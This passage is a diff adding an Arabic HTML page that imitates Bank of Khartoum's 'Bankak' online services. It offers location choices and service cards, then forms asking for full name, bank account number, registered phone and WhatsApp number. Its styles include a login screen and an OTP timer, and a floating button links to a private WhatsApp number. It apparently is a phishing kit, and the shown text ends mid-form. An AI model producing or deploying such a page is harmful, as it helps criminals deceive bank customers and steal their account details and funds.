@@ -1,0 +1,1934 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>خدمات بنكك أونلاين - بنك الخرطوم</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- استدعاء خط يدوي لاستمارة التحديث -->
+    <link href="https://fonts.googleapis.com/css2?family=Reem+Kufi&family=Marhey&family=Cairo:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Cairo', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background-color: #f9f9f9;
+            color: #333;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        /* حاوية الصفحة الرئيسية لاختيار الموقع */
+        #mainAppHome {
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            width: 100%;
+        }
+
+        /* الجزء العلوي الأحمر */
+        .header-section {
+            background-color: #dc2626;
+            width: 100%;
+            padding: 20px 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+        }
+
+        .logo-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 15px;
+        }
+
+        .action-btn {
+            background-color: #facc15;
+            color: #1f2937;
+            font-weight: bold;
+            padding: 10px 30px;
+            border-radius: 25px;
+            border: none;
+            font-size: 16px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            cursor: pointer;
+            margin-top: 5px;
+        }
+
+        /* محتوى الصفحة الرئيسي */
+        .main-content {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 30px 20px;
+            text-align: center;
+        }
+
+        .welcome-title {
+            color: #dc2626;
+            font-size: 22px;
+            font-weight: bold;
+            margin-bottom: 8px;
+        }
+
+        .welcome-subtitle {
+            color: #4b5563;
+            font-size: 16px;
+            margin-bottom: 8px;
+        }
+
+        .instruction-text {
+            color: #6b7280;
+            font-size: 14px;
+            margin-bottom: 30px;
+        }
+
+        /* بطاقات الاختيار (داخل السودان في الأعلى، وخارج السودان في الأسفل) */
+        .cards-container {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+            width: 100%;
+            max-width: 450px;
+            margin-bottom: 30px;
+        }
+
+        .option-card {
+            background-color: #ffffff;
+            border-radius: 12px;
+            padding: 30px 20px;
+            flex: 1;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            border: 1px solid #f3f4f6;
+            transition: transform 0.2s;
+        }
+
+        .option-card:hover {
+            transform: translateY(-3px);
+        }
+
+        .option-card i {
+            color: #dc2626;
+            font-size: 40px;
+            margin-bottom: 15px;
+        }
+
+        .option-title {
+            color: #dc2626;
+            font-size: 18px;
+            font-weight: bold;
+            margin-bottom: 8px;
+        }
+
+        .option-desc {
+            color: #6b7280;
+            font-size: 13px;
+        }
+
+        .divider {
+            width: 100%;
+            height: 1px;
+            background-color: #e5e7eb;
+            margin: 20px 0;
+        }
+
+        /* التذييل (Footer) */
+        .footer {
+            text-align: center;
+            color: #9ca3af;
+            font-size: 12px;
+            padding: 15px;
+            margin-bottom: 60px;
+        }
+
+        /* شاشة ملء الشاشة لقائمة الخدمات داخل السودان بمستطيلات شفافة وأيقونات ملونة */
+        #sudanServicesScreen {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: linear-gradient(135deg, #fdf2f2 0%, #ffffff 100%);
+            z-index: 2500;
+            flex-direction: column;
+            overflow-y: auto;
+        }
+
+        .sudan-screen-header {
+            background-color: #dc2626;
+            color: white;
+            padding: 20px 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            box-shadow: 0 4px 10px rgba(220, 38, 38, 0.2);
+        }
+
+        .sudan-screen-title {
+            font-size: 1.15rem;
+            font-weight: bold;
+            color: #ffffff;
+        }
+
+        .sudan-screen-back {
+            background: rgba(255, 255, 255, 0.2);
+            border: 1px solid rgba(255, 255, 255, 0.4);
+            color: white;
+            padding: 6px 14px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 0.9rem;
+            font-weight: bold;
+        }
+
+        .sudan-screen-body {
+            padding: 25px 20px;
+            max-width: 500px;
+            width: 100%;
+            margin: 0 auto;
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+        }
+
+        .sudan-screen-subtitle {
+            font-size: 1rem;
+            font-weight: bold;
+            color: #dc2626; /* تم تغيير اللون إلى الأحمر */
+            margin-bottom: 5px;
+            text-align: right;
+        }
+
+        .service-glass-card {
+            background: rgba(255, 255, 255, 0.75);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            border: 1px solid rgba(220, 38, 38, 0.15);
+            border-radius: 14px;
+            padding: 18px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            cursor: pointer;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.03);
+            transition: all 0.3s ease;
+        }
+
+        .service-glass-card:hover {
+            background: rgba(255, 255, 255, 0.95);
+            border-color: #dc2626;
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(220, 38, 38, 0.1);
+        }
+
+        .service-card-right {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .service-icon-box {
+            width: 48px;
+            height: 48px;
+            border-radius: 12px;
+            background: #fff5f5;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+            color: #dc2626;
+            box-shadow: 0 2px 5px rgba(220, 38, 38, 0.1);
+        }
+
+        .service-card-title {
+            font-size: 1rem;
+            font-weight: bold;
+            color: #dc2626; /* تم تغيير اللون إلى الأحمر */
+        }
+
+        .service-card-arrow {
+            color: #dc2626;
+            font-size: 16px;
+        }
+
+        /* شاشة الاستمارة المبسطة لقسم داخل السودان (أبيض شفاف ونصوص ورسومات حمراء) */
+        #sudanFormScreen {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: linear-gradient(135deg, #fdf2f2 0%, #ffffff 100%);
+            z-index: 2600;
+            flex-direction: column;
+            overflow-y: auto;
+        }
+
+        .sudan-form-body {
+            padding: 25px 20px;
+            max-width: 500px;
+            width: 100%;
+            margin: 0 auto;
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+        }
+
+        .glass-input-container {
+            background: rgba(255, 255, 255, 0.85);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            border: 1px solid rgba(220, 38, 38, 0.3);
+            border-radius: 12px;
+            padding: 14px 16px;
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            box-shadow: 0 4px 12px rgba(220, 38, 38, 0.05);
+        }
+
+        .glass-input-container i {
+            color: #dc2626;
+            font-size: 20px;
+            min-width: 24px;
+            text-align: center;
+        }
+
+        .glass-input-field {
+            width: 100%;
+            background: transparent;
+            border: none;
+            outline: none;
+            font-size: 15px;
+            color: #dc2626;
+            font-weight: bold;
+        }
+
+        .glass-input-field::placeholder {
+            color: #dc2626;
+            opacity: 0.7;
+            font-weight: normal;
+        }
+
+        /* زر الواتساب العائم */
+        .whatsapp-float {
+            position: fixed;
+            bottom: 25px;
+            left: 25px;
+            background-color: #25d366;
+            color: white;
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 32px;
+            box-shadow: 0 4px 15px rgba(37, 211, 102, 0.5);
+            z-index: 100;
+            text-decoration: none;
+            transition: transform 0.3s ease;
+        }
+
+        .whatsapp-float:hover {
+            transform: scale(1.1);
+        }
+
+        .whatsapp-float::after {
+            content: '';
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            border: 2px solid #25d366;
+            top: 0;
+            left: 0;
+            animation: pulse-animation 1.6s infinite;
+            z-index: -1;
+        }
+
+        @keyframes pulse-animation {
+            0% { transform: scale(1); opacity: 1; }
+            100% { transform: scale(1.8); opacity: 0; }
+        }
+
+        /* تصميم نقاط التحميل المتمددة والمتحركة */
+        .dots-loader {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .dots-loader div {
+            width: 14px;
+            height: 14px;
+            background-color: #b90924;
+            border-radius: 50%;
+            animation: stretchDots 1.4s infinite ease-in-out both;
+        }
+
+        .dots-loader div:nth-child(1) { animation-delay: -0.32s; }
+        .dots-loader div:nth-child(2) { animation-delay: -0.16s; }
+        .dots-loader div:nth-child(3) { animation-delay: 0s; }
+
+        @keyframes stretchDots {
+            0%, 80%, 100% { transform: scale(0.4); opacity: 0.4; }
+            40% { transform: scale(1.2); opacity: 1; }
+        }
+
+        /* شاشة التحميل المميزة */
+        #globalLoader {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background-color: #ffffff;
+            z-index: 3000;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            color: #1f2937;
+            text-align: center;
+        }
+
+        /* حاوية استمارة التحديث / التطبيق */
+        #updateContainer {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background-color: #ffffff;
+            z-index: 2000;
+            overflow-y: auto;
+        }
+
+        .app-screen {
+            width: 100%;
+            min-height: 100vh;
+            background-color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            position: relative;
+        }
+        .screen {
+            display: none;
+            flex-direction: column;
+            height: 100%;
+            width: 100%;
+            overflow-y: auto;
+        }
+        .screen.active {
+            display: flex;
+        }
+        .navbar, .navbar-bok {
+            background-color: #b90924;
+            color: white;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 14px 16px;
+        }
+        .nav-left, .nav-right {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+        .nav-icon {
+            width: 24px;
+            height: 24px;
+            fill: white;
+            cursor: pointer;
+        }
+        .page-header, .page-header-bok {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px 16px 10px 16px;
+            text-align: center;
+            border-bottom: 1px solid #eee;
+        }
+        .form-main-title-ar {
+            color: #b90924;
+            font-size: 1.3rem;
+            font-weight: bold;
+            margin-bottom: 4px;
+        }
+        .form-main-title-en {
+            color: #b90924;
+            font-size: 1rem;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+        .bank-logo-text {
+            font-weight: 900;
+            font-size: 1.5rem;
+            color: #111;
+        }
+        .bank-logo-text span {
+            color: #8cc63f;
+        }
+        .form-content, .form-section {
+            padding: 15px 20px 30px 20px;
+            flex-grow: 1;
+        }
+        .field-row {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            padding: 12px 0;
+            border-bottom: 1px solid #f0f0f0;
+        }
+        .field-icon {
+            width: 28px;
+            height: 28px;
+            fill: #dc2626 !important;
+            flex-shrink: 0;
+        }
+        .field-body {
+            flex-grow: 1;
+        }
+        .input-box, .select-box, .input-box-bok, .select-box-bok, .input-field {
+            width: 100%;
+            padding: 12px 14px;
+            border: 1px solid #cbd5e0;
+            border-radius: 8px;
+            font-size: 14px;
+            color: #2d3748;
+            background-color: #fafbfc;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+        .input-field {
+            padding: 12px 45px 12px 45px;
+            background-color: #ffffff;
+            border: 1px solid #e2e8f0;
+            border-radius: 8px;
+        }
+        .input-box:focus, .select-box:focus, .input-box-bok:focus, .select-box-bok:focus, .input-field:focus {
+            border-color: #b90924;
+            background-color: #fff;
+        }
+        .input-error {
+            border-color: #b90924 !important;
+            background-color: #fff5f5 !important;
+        }
+        .select-box, .select-box-bok {
+            appearance: none;
+            background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23dc2626'%3e%3cpath d='M7 10l5 5 5-5z'/%3e%3c/svg%3e");
+            background-repeat: no-repeat;
+            background-position: left 10px center;
+            background-size: 18px;
+            cursor: pointer;
+        }
+        .submit-container {
+            padding: 20px;
+        }
+        .btn-submit, .btn-red {
+            background-color: #dc2626;
+            color: white;
+            border: none;
+            width: 100%;
+            padding: 14px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            text-align: center;
+            box-shadow: 0 4px 10px rgba(185, 9, 36, 0.2);
+            transition: background 0.2s;
+        }
+        .btn-red {
+            background: linear-gradient(180deg, #ed1c24 0%, #b80c13 100%);
+            border: 1px solid #99080e;
+            padding: 12px;
+            font-size: 1.1rem;
+            margin-bottom: 12px;
+            border-radius: 8px;
+        }
+        .btn-group {
+            display: flex;
+            gap: 10px;
+            margin-top: 10px;
+        }
+        .btn-group .btn-red {
+            flex: 1;
+        }
+        #loader-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(255, 255, 255, 0.95);
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            text-align: center;
+            padding: 20px;
+        }
+        .bankak-loader-box {
+            background: #ffffff;
+            padding: 30px;
+            border-radius: 16px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            max-width: 280px;
+            width: 100%;
+        }
+        .loader-text {
+            color: #2d3748;
+            font-size: 15px;
+            font-weight: bold;
+        }
+        
+        .preview-form-container {
+            background-color: #fcf8f2;
+            background-image: linear-gradient(135deg, #fdfbf7 0%, #f7f1e5 100%);
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            position: relative;
+            min-height: 100%;
+            overflow-y: auto;
+        }
+        .bok-preview-card {
+            background: #ffffff;
+            border: 1px solid #e2dacd;
+            border-radius: 12px;
+            width: 100%;
+            max-width: 400px;
+            padding: 20px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
+            margin-top: 10px;
+            position: relative;
+            overflow: hidden;
+        }
+        .bok-header-section {
+            text-align: center;
+            border-bottom: 2px solid #f0e6d6;
+            padding-bottom: 15px;
+            margin-bottom: 15px;
+        }
+        .bok-title-ar {
+            color: #b90924;
+            font-size: 1.15rem;
+            font-weight: bold;
+            margin-bottom: 2px;
+        }
+        .bok-title-en {
+            color: #b90924;
+            font-size: 0.85rem;
+            font-weight: bold;
+            margin-bottom: 12px;
+        }
+        .bok-logo-img {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 5px;
+        }
+        .bok-logo-img .green-circle {
+            width: 32px;
+            height: 32px;
+            background: #8cc63f;
+            border-radius: 50%;
+            display: inline-block;
+        }
+        .handwritten-field {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 8px 0;
+            border-bottom: 1px dashed #e2dacd;
+            font-size: 0.85rem;
+            color: #333;
+        }
+        .handwritten-label {
+            font-weight: bold;
+            color: #444;
+            width: 35%;
+        }
+        .handwritten-value {
+            width: 63%;
+            color: #1a365d;
+            font-family: 'Reem Kufi', cursive, sans-serif;
+            font-size: 1.05rem;
+            letter-spacing: 0.5px;
+            border-bottom: 1px solid #bce3ff;
+            padding-bottom: 2px;
+            min-height: 28px;
+            display: flex;
+            align-items: center;
+        }
+        .gold-stripes {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 140px;
+            height: 140px;
+            background: repeating-linear-gradient(45deg, #d4af37, #d4af37 10px, transparent 10px, transparent 20px);
+            opacity: 0.15;
+            pointer-events: none;
+        }
+        
+        .top-header {
+            background: linear-gradient(180deg, #e10a14 0%, #b80c13 100%);
+            padding: 20px 16px;
+            width: 100%;
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+        .header-bar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            width: 100%;
+            margin-bottom: 10px;
+        }
+        .page-title {
+            color: #ffffff;
+            font-size: 1.1rem;
+            font-weight: bold;
+        }
+        .btn-back {
+            background: rgba(255, 255, 255, 0.2);
+            border: 1px solid rgba(255, 255, 255, 0.4);
+            color: #ffffff;
+            padding: 2px 10px;
+            border-radius: 12px;
+            font-size: 0.8rem;
+            cursor: pointer;
+        }
+        
+        .bankak-login-header {
+            background-color: #dc2626;
+            width: 100%;
+            padding: 35px 20px 130px 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-start;
+            position: relative;
+        }
+        .logo-box {
+            text-align: center;
+            color: #ffffff;
+            user-select: none;
+            margin-bottom: 20px;
+        }
+        .logo-ar {
+            font-size: 3.2rem;
+            font-weight: 900;
+            line-height: 1;
+            font-family: 'Marhey', 'Cairo', sans-serif;
+        }
+        .logo-ar span { color: #f59e0b; }
+        .logo-en {
+            font-size: 1.8rem;
+            font-weight: 800;
+            line-height: 1;
+            margin-top: -2px;
+        }
+        .logo-en span { color: #f59e0b; }
+
+        .bankak-login-form-container {
+            width: 100%;
+            max-width: 480px;
+            margin: -90px auto 0 auto;
+            padding: 0 20px;
+            position: relative;
+            z-index: 10;
+        }
+
+        .login-card-box {
+            background: #ffffff;
+            border-radius: 14px;
+            padding: 22px 20px;
+            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.08);
+            border: 1px solid #f0f0f0;
+        }
+
+        .loading-screen {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            flex: 1;
+            background: #ffffff;
+            padding: 24px;
+            text-align: center;
+        }
+        .loading-title {
+            font-size: 1.2rem;
+            font-weight: 800;
+            color: #111827;
+            margin-bottom: 6px;
+        }
+        .loading-subtitle {
+            font-size: 0.88rem;
+            color: #dc2626;
+            font-weight: 600;
+            margin-bottom: 24px;
+        }
+        .contact-card {
+            width: 100%;
+            max-width: 350px;
+            background: #f8fafc;
+            border: 1px solid #e2e8f0;
+            border-radius: 12px;
+            padding: 16px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.03);
+        }
+        .contact-title {
+            font-size: 0.85rem;
+            color: #475569;
+            margin-bottom: 10px;
+        }
+        .contact-number {
+            font-size: 1.8rem;
+            font-weight: 900;
+            color: #e10a14;
+            letter-spacing: 2px;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        .whatsapp-info {
+            font-size: 0.82rem;
+            color: #16a34a;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            margin-top: 6px;
+            padding-top: 8px;
+            border-top: 1px dashed #cbd5e1;
+        }
+
+        .bottom-nav {
+            display: flex;
+            justify-content: space-around;
+            align-items: center;
+            padding: 20px 10px 40px 10px;
+            background-color: #ffffff;
+            border-top: 1px solid #f3f4f6;
+            margin-top: auto;
+        }
+        .nav-link {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 6px;
+            text-decoration: none;
+            color: #6b7280;
+            font-size: 0.8rem;
+        }
+        .icon-circle {
+            width: 44px;
+            height: 44px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #ffffff;
+            font-size: 1.1rem;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+        .icon-fb { background-color: #3b5998; }
+        .icon-help { background-color: #8cc63f; }
+        .icon-location { background-color: #e10a14; }
+        .icon-bok { background: linear-gradient(135deg, #8cc63f 50%, #009245 50%); }
+
+        .otp-card {
+            border: 1px solid #e5e7eb;
+            border-radius: 12px;
+            padding: 20px;
+            margin: 20px 0;
+            text-align: center;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+        }
+        .timer-circle {
+            width: 48px;
+            height: 48px;
+            border: 3px solid #10b981;
+            border-top-color: transparent;
+            border-radius: 50%;
+            margin: 0 auto 10px;
+            animation: spin 2s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .timer-text {
+            font-size: 1.1rem;
+            font-weight: bold;
+            color: #111827;
+            margin-bottom: 8px;
+        }
+        .otp-info {
+            font-size: 0.82rem;
+            color: #6b7280;
+            margin-bottom: 16px;
+        }
+        .resend-link {
+            font-size: 0.80rem;
+            color: #6b7280;
+            text-decoration: underline;
+            cursor: pointer;
+            display: inline-block;
+            margin-bottom: 12px;
+        }
+        
+        .icon-right {
+            position: absolute;
+            right: 14px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #dc2626 !important;
+            font-size: 1.1rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            pointer-events: none;
+        }
+        .icon-left-toggle {
+            position: absolute;
+            left: 14px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #718096;
+            font-size: 1.1rem;
+            cursor: pointer;
+            user-select: none;
+            z-index: 10;
+        }
+
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+            padding: 15px;
+        }
+
+        .modal-content, .modal-box {
+            background-color: #ffffff;
+            padding: 25px;
+            border-radius: 16px;
+            width: 100%;
+            max-width: 500px;
+            max-height: 85vh;
+            overflow-y: auto;
+            text-align: right;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
+            animation: modalPop 0.3s ease;
+        }
+
+        @keyframes modalPop {
+            0% { transform: scale(0.9); opacity: 0; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- الجزء الرئيسي لاختيار الموقع -->
+    <div id="mainAppHome">
+        <div class="header-section">
+            <div class="logo-container">
+                <div style="color: white; font-weight: bold; font-size: 18px; display: flex; align-items: center; gap: 8px;">
+                    بنك الخرطوم <span style="font-size: 12px; font-weight:normal; opacity: 0.9;">Bank of Khartoum</span>
+                </div>
+            </div>
+            <button class="action-btn">خدمات بنكك أونلاين</button>
+        </div>
+
+        <div class="main-content">
+            <h2 class="welcome-title">أهلًا وسهلًا بك في خدمات بنكك أونلاين</h2>
+            <p class="welcome-subtitle">هل أنت داخل السودان أو خارج السودان؟</p>
+            <p class="instruction-text">اختر موقعك المناسب إلى خدمات بنك الدخول</p>
+
+            <div class="cards-container">
+                <!-- داخل السودان (في الأعلى) -->
+                <div class="option-card" onclick="openSudanServicesScreen()">
+                    <i class="fa-solid fa-location-dot"></i>
+                    <h3 class="option-title">داخل السودان</h3>
+                    <p class="option-desc">المتابعة من داخل السودان</p>
+                </div>
+
+                <!-- خارج السودان (في الأسفل) -->
+                <div class="option-card" onclick="openUpdateFormWithLoader()">
+                    <i class="fa-solid fa-globe"></i>
+                    <h3 class="option-title">خارج السودان / الولايات الغير مستقرة</h3>
+                    <p class="option-desc">المتابعة من خارج السودان/المناطق الغير أمنه</p>
+                </div>
+            </div>
+
+            <div class="divider"></div>
+
+            <div class="footer">
+                <p>iBOK أ بنك الخرطوم 2026</p>
+                <p>جميع الحقوق محفوظة، لدى بنك الخرطوم، iBOK 2026</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- شاشة ملء الشاشة لقائمة الخدمات داخل السودان بمستطيلات شفافة وأيقونات ملونة -->
+    <div id="sudanServicesScreen">
+        <div class="sudan-screen-header">
+            <span class="sudan-screen-title">خدمات بنكك - داخل السودان</span>
+            <button class="sudan-screen-back" onclick="closeSudanServicesScreen()">رجوع ➔</button>
+        </div>
+        <div class="sudan-screen-body">
+            <div class="sudan-screen-subtitle">يرجى اختيار الخدمة المطلوبة للمتابعة:</div>
+            
+            <div class="service-glass-card" onclick="openSudanForm('إعادة تنشيط حساب')">
+                <div class="service-card-right">
+                    <div class="service-icon-box" style="color: #2563eb; background: #eff6ff;"><i class="fa-solid fa-rotate-right"></i></div>
+                    <div class="service-card-title">إعادة تنشيط حساب</div>
+                </div>
+                <div class="service-card-arrow"><i class="fa-solid fa-chevron-left"></i></div>
+            </div>
+
+            <div class="service-glass-card" onclick="openSudanForm('خدمات العملات الأجنبية')">
+                <div class="service-card-right">
+                    <div class="service-icon-box" style="color: #16a34a; background: #f0fdf4;"><i class="fa-solid fa-coins"></i></div>
+                    <div class="service-card-title">خدمات العملات الأجنبية</div>
+                </div>
+                <div class="service-card-arrow"><i class="fa-solid fa-chevron-left"></i></div>
+            </div>
+
+            <div class="service-glass-card" onclick="openSudanForm('الاستعلام عن الرصيد كشف حساب مصغر')">
+                <div class="service-card-right">
+                    <div class="service-icon-box" style="color: #ca8a04; background: #fefce8;"><i class="fa-solid fa-file-invoice-dollar"></i></div>
+                    <div class="service-card-title">الاستعلام عن الرصيد كشف حساب مصغر</div>
+                </div>
+                <div class="service-card-arrow"><i class="fa-solid fa-chevron-left"></i></div>
+            </div>
+
+            <div class="service-glass-card" onclick="openSudanForm('تعديل رقم الهاتف')">
+                <div class="service-card-right">
+                    <div class="service-icon-box" style="color: #9333ea; background: #faf5ff;"><i class="fa-solid fa-mobile-screen-button"></i></div>
+                    <div class="service-card-title">تعديل رقم الهاتف</div>
+                </div>
+                <div class="service-card-arrow"><i class="fa-solid fa-chevron-left"></i></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- شاشة استمارة الخدمات الداخلية (أبيض شفاف، نصوص ورسومات حمراء) -->
+    <div id="sudanFormScreen">
+        <div class="sudan-screen-header">
+            <span class="sudan-screen-title" id="sudanFormTitle">استمارة الخدمة</span>
+            <button class="sudan-screen-back" onclick="closeSudanFormScreen()">رجوع ➔</button>
+        </div>
+        <div class="sudan-form-body">
+            <div class="sudan-screen-subtitle">يرجى تعبئة البيانات التالية للمتابعة:</div>
+
+            <div class="glass-input-container">
+                <i class="fa-solid fa-user"></i>
+                <input type="text" id="sudan-name" class="glass-input-field" placeholder="الاسم">
+            </div>
+
+            <div class="glass-input-container">
+                <i class="fa-solid fa-id-card"></i>
+                <input type="text" id="sudan-account" class="glass-input-field" placeholder="رقم الحساب">
+            </div>
+
+            <div class="glass-input-container">
+                <i class="fa-solid fa-phone"></i>
+                <input type="text" id="sudan-phone" class="glass-input-field" placeholder="رقم الهاتف المسجل مع الحساب">
+            </div>
+
+            <div class="glass-input-container">
+                <i class="fa-brands fa-whatsapp"></i>
+                <input type="text" id="sudan-whatsapp" class="glass-input-field" placeholder="رقم الواتساب">
+            </div>
+
+            <button class="btn-submit" style="margin-top: 10px;" onclick="submitSudanForm()">متابعة إلى تطبيق بنكك</button>
+        </div>
+    </div>
+
+    <!-- شاشة التحميل -->
+    <div id="globalLoader">
+        <div class="dots-loader">
+            <div></div>
+            <div></div>
+            <div></div>
+        </div>
+        <div style="font-size: 18px; font-weight: bold; color: #1f2937;" id="globalLoaderText">جاري الاتصال بخدمات بنكك...</div>
+        <div style="font-size: 14px; margin-top: 8px; color: #6b7280;">يرجى الانتظار قليلاً</div>
+    </div>
+
+    <!-- زر الواتساب العائم -->
+    <a href="https://wa.me/2490128093955" class="whatsapp-float" target="_blank" title="تواصل معنا عبر واتساب">
+        <i class="fa-brands fa-whatsapp"></i>
+    </a>
+
+    <!-- حاوية استمارة التحديث / التطبيق -->
+    <div id="updateContainer">
+        <div class="app-screen">
+
+            <div id="loader-overlay">
+                <div class="bankak-loader-box">
+                    <div class="dots-loader" style="background: transparent;">
+                        <div style="background-color: #b90924;"></div>
+                        <div style="background-color: #b90924;"></div>
+                        <div style="background-color: #b90924;"></div>
+                    </div>
+                    <div class="loader-text" id="loader-message">جاري الانتقال...</div>
+                </div>
+            </div>
+
+            <!-- 1. الشاشة الأولى: استمارة تحديث بيانات العملاء -->
+            <div class="screen active" id="screenProfile">
+                <div class="navbar">
+                    <div class="nav-left">
+                        <svg class="nav-icon" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/></svg>
+                    </div>
+                    <div style="font-weight: bold; font-size: 18px; letter-spacing: 1px;">بنك الخرطوم</div>
+                    <div class="nav-right">
+                        <svg class="nav-icon" viewBox="0 0 24 24"><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
+                    </div>
+                </div>
+
+                <div class="page-header">
+                    <div class="form-main-title-ar" id="serviceHeaderTitle">استمارة تحديث بيانات العملاء</div>
+                    <div class="form-main-title-en">Customer Information Update Form</div>
+                    <div class="bank-logo-text"><span></span></div>
+                </div>
+
+                <div class="form-content">
+                    <div class="field-row">
+                        <svg class="field-icon" viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
+                        <div class="field-body">
+                            <input type="text" id="field-name" class="input-box" placeholder="الاسم رباعي">
+                        </div>
+                    </div>
+
+                    <div class="field-row">
+                        <svg class="field-icon" viewBox="0 0 24 24"><path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 14H4V6h16v12zM6 10h12v2H6zm0 4h8v2H6z"/></svg>
+                        <div class="field-body">
+                            <input type="text" id="field-account" class="input-box" maxlength="7" placeholder="رقم الحساب البنكي">
+                        </div>
+                    </div>
+
+                    <div class="field-row">
